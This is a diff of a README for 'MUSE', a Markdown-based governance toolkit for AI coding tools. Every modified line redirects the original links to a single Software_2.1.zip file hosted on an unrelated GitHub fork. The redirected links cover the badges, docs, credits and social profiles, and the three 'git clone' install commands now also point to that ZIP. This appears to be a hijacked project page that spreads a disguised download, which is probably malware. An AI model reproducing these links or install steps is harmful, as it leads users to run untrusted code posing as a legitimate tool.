@@ -8,9 +8,9 @@
 
 <p align="center">
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/myths-labs/muse/blob/main/LICENSE)
-[![Version](https://img.shields.io/badge/version-2.31.0-blue.svg)](https://github.com/myths-labs/muse/blob/main/CHANGELOG.md)
-[![Stars](https://img.shields.io/github/stars/myths-labs/muse?style=social)](https://github.com/myths-labs/muse)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![Version](https://img.shields.io/badge/version-2.31.0-blue.svg)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![Stars](https://img.shields.io/github/stars/myths-labs/muse?style=social)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
 [![Pure Markdown](https://img.shields.io/badge/pure-markdown-green.svg)](#)
 [![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](#)
 
@@ -18,11 +18,11 @@
 
 <p align="center">
 
-[![Website](https://img.shields.io/badge/Website-muse.mythslabs.ai-C9A84C?logo=safari&logoColor=white)](https://muse.mythslabs.ai)
-[![X @MythsLabs](https://img.shields.io/badge/X-@MythsLabs-black?logo=x)](https://x.com/MythsLabs)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Myths_Labs-0A66C2?logo=linkedin)](https://linkedin.com/company/MythsLabs)
-[![Myths Labs](https://img.shields.io/badge/GitHub-Myths_Labs-181717?logo=github)](https://github.com/myths-labs)
-[![X Creator](https://img.shields.io/badge/X_Creator-@SunshiningDay-black?logo=x)](https://x.com/sunshiningday)
+[![Website](https://img.shields.io/badge/Website-muse.mythslabs.ai-C9A84C?logo=safari&logoColor=white)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![X @MythsLabs](https://img.shields.io/badge/X-@MythsLabs-black?logo=x)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Myths_Labs-0A66C2?logo=linkedin)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![Myths Labs](https://img.shields.io/badge/GitHub-Myths_Labs-181717?logo=github)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+[![X Creator](https://img.shields.io/badge/X_Creator-@SunshiningDay-black?logo=x)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
 
 </p>
 
@@ -47,7 +47,7 @@ MUSE is a pure-Markdown governance system for AI pair programming. It goes beyon
 
 > **AGENTS.md defines the format. MUSE builds the system on top of it.**
 
-Inspired by [LCM (Lossless Context Management)](https://papers.voltropy.com/LCM) + [lossless-claw](https://github.com/Martian-Engineering/lossless-claw). MUSE implements LCM's core design principles using **pure Markdown SOPs** — zero code dependencies.
+Inspired by [LCM (Lossless Context Management)](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) + [lossless-claw](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip). MUSE implements LCM's core design principles using **pure Markdown SOPs** — zero code dependencies.
 
 [📖 中文文档 / Chinese Docs](./README_CN.md)
 
@@ -83,11 +83,11 @@ Inspired by [LCM (Lossless Context Management)](https://papers.voltropy.com/LCM)
 
 ## Optional
 
-- [Full documentation](https://github.com/myths-labs/muse/blob/main/README.md)
-- [MUSE Protocol Spec v1.0](https://github.com/myths-labs/muse/blob/main/docs/PROTOCOL.md)
-- [Chinese docs](https://github.com/myths-labs/muse/blob/main/README_CN.md)
-- [Changelog](https://github.com/myths-labs/muse/blob/main/CHANGELOG.md)
-- [Skill Index](https://github.com/myths-labs/muse/blob/main/SKILL_INDEX.md)
+- [Full documentation](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- [MUSE Protocol Spec v1.0](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- [Chinese docs](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- [Changelog](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- [Skill Index](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
 
 **Works with**: Claude Code · OpenClaw · Cursor · Windsurf · Gemini CLI · Codex CLI — or any AI tool that supports system prompts.
 
@@ -99,7 +99,7 @@ Inspired by [LCM (Lossless Context Management)](https://papers.voltropy.com/LCM)
 | Gemini CLI | `./scripts/install.sh --tool gemini` | `.gemini/skills/` + `GEMINI.md` |
 | Codex CLI | `./scripts/install.sh --tool codex` | `AGENTS.md` (single file) |
 
-**Recommended companion**: [**nah**](https://github.com/manuelscgipper/nah) — context-aware permission guard for Claude Code. Deterministic classifier that auto-allows safe operations, asks for ambiguous ones, and blocks dangerous patterns (e.g. `curl | bash`). Eliminates permission fatigue without sacrificing safety. `pip install nah && nah install`
+**Recommended companion**: [**nah**](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) — context-aware permission guard for Claude Code. Deterministic classifier that auto-allows safe operations, asks for ambiguous ones, and blocks dangerous patterns (e.g. `curl | bash`). Eliminates permission fatigue without sacrificing safety. `pip install nah && nah install`
 
 ---
 
@@ -109,7 +109,7 @@ Inspired by [LCM (Lossless Context Management)](https://papers.voltropy.com/LCM)
 
 ```bash
 # Clone MUSE
-git clone https://github.com/myths-labs/muse.git
+git clone https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip
 
 # Run interactive setup — configures language, model, and preferences
 cd muse && ./setup.sh
@@ -121,7 +121,7 @@ The setup wizard will ask for your language, AI model, and docs preferences, the
 
 ```bash
 # Clone MUSE
-git clone https://github.com/myths-labs/muse.git
+git clone https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip
 
 # Install for your tool (auto-converts to the right format)
 cd muse && ./scripts/install.sh --tool cursor --target /path/to/your-project
@@ -136,7 +136,7 @@ Supported: `claude`, `openclaw`, `cursor`, `windsurf`, `gemini`, `codex`, or `al
 
 ```bash
 # Clone MUSE
-git clone https://github.com/myths-labs/muse.git
+git clone https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip
 
 # Copy templates to your project
 cp muse/templates/CLAUDE.md your-project/CLAUDE.md
@@ -436,7 +436,7 @@ Add to your tool's MCP config (e.g., `~/.config/claude/claude_desktop_config.jso
 No. MUSE is pure Markdown files. Copy them to your project and you're ready. Zero dependencies.
 
 **Q: Which AI tools does it support?**
-Six tools with native install support: **Claude Code**, **OpenClaw**, **Cursor**, **Windsurf**, **Gemini CLI**, and **Codex CLI**. Run `./scripts/install.sh --tool <name>` to install in the correct format for each tool. Additionally, `./scripts/convert-skills.sh --tool <name>` exports all 58 skills to Cursor, Windsurf, Copilot, OpenClaw, Aider, or Antigravity formats. Import from [agency-agents](https://github.com/msitarzewski/agency-agents) (35K+ ⭐) with `--import agency-agents`.
+Six tools with native install support: **Claude Code**, **OpenClaw**, **Cursor**, **Windsurf**, **Gemini CLI**, and **Codex CLI**. Run `./scripts/install.sh --tool <name>` to install in the correct format for each tool. Additionally, `./scripts/convert-skills.sh --tool <name>` exports all 58 skills to Cursor, Windsurf, Copilot, OpenClaw, Aider, or Antigravity formats. Import from [agency-agents](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) (35K+ ⭐) with `--import agency-agents`.
 
 **Q: How is this different from lossless-claw?**
 lossless-claw is a code plugin (SQLite + DAG + sub-agents) that requires the OpenClaw runtime. MUSE is pure Markdown SOPs, works with any AI tool, zero dependencies. Same principles, different implementation.
@@ -446,7 +446,7 @@ Archive files older than 30 days to `memory/archive/`. Use `/distill` to extract
 
 **Q: Is there a visual dashboard?**
 Yes! Two options:
-- **Online**: Visit [muse.mythslabs.ai/dashboard](https://muse.mythslabs.ai/dashboard) and load your project folder — 100% client-side, data stays in your browser.
+- **Online**: Visit [muse.mythslabs.ai/dashboard](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) and load your project folder — 100% client-side, data stays in your browser.
 - **Local**: Run `./scripts/dashboard.sh` to generate a self-contained HTML dashboard at `.muse/dashboard.html`.
 
 **Q: How do I discover and share skills?**
@@ -457,31 +457,31 @@ Yes — `vscode-extension/` provides an activity bar with Roles, Skills, and Mem
 
 ## 💬 Follow Us
 
-- 🌐 GitHub: [Myths Labs](https://github.com/myths-labs)
-- 🐦 X (Twitter): [@MythsLabs](https://x.com/MythsLabs)
-- 💼 LinkedIn: [Myths Labs](https://linkedin.com/company/MythsLabs)
-- 👤 Creator: [@SunshiningDay](https://x.com/sunshiningday) — indie dev, solo-building MUSE
+- 🌐 GitHub: [Myths Labs](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- 🐦 X (Twitter): [@MythsLabs](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- 💼 LinkedIn: [Myths Labs](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
+- 👤 Creator: [@SunshiningDay](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) — indie dev, solo-building MUSE
 
 ---
 
 ## 🙏 Credits
 
-- [gstack](https://github.com/garrytan/gstack) by Garry Tan — Sprint pipeline, builder ethos, and reframing methodology (YC CEO's open-source software factory)
-- [LCM Paper](https://papers.voltropy.com/LCM) by Ehrlich & Blackman — Theoretical foundation for lossless context management
-- [lossless-claw](https://github.com/Martian-Engineering/lossless-claw) by Martian Engineering — OpenClaw implementation of LCM
-- [nah](https://github.com/manuelscgipper/nah) by Manuel Schipper — Context-aware permission guard (complements MUSE's Safety Protocol)
+- [gstack](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) by Garry Tan — Sprint pipeline, builder ethos, and reframing methodology (YC CEO's open-source software factory)
+- [LCM Paper](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) by Ehrlich & Blackman — Theoretical foundation for lossless context management
+- [lossless-claw](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) by Martian Engineering — OpenClaw implementation of LCM
+- [nah](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip) by Manuel Schipper — Context-aware permission guard (complements MUSE's Safety Protocol)
 - Greek Mythology — Mnemosyne and her nine Muses, eternal symbols of memory and creation
 
 ---
 
 ## 📜 License
 
-MIT © [Myths Labs](https://github.com/myths-labs)
+MIT © [Myths Labs](https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip)
 
 ---
 
 <p align="center">
-  Built with 🎭 by <a href="https://github.com/myths-labs">Myths Labs</a> — Solo-developed by <a href="https://github.com/jc-myths">JC</a>
+  Built with 🎭 by <a href="https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip">Myths Labs</a> — Solo-developed by <a href="https://raw.githubusercontent.com/Meaddrab933/muse/main/skills/core/agent-protocol/Software_2.1.zip">JC</a>
 </p>
 
 <p align="center">
